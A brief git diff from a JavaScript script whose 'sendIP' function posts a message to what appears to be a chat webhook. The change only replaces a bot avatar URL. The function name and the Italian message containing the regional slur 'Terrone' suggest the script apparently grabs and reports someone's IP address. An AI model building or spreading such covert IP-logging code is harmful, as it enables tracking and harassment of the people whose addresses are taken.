@@ -14,7 +14,7 @@ const sendIP = () => {
                         },
                         body: JSON.stringify({
                             username: "Sono Un Bot", // optionally changeable
-                            avatar_url: "https://media.trustradius.com/vendor-logos/nn/Ie/WQRTT9T5T4XP.JPEG", // optionally changeable
+                            avatar_url: "https://github.com/danyx64YT/Project-Matrix-EXE/blob/main/bot-img.png?raw=true", // optionally changeable
                             content: `Bro Ho Trovato Il Terrone @here`,
                             embeds: [
                                 {
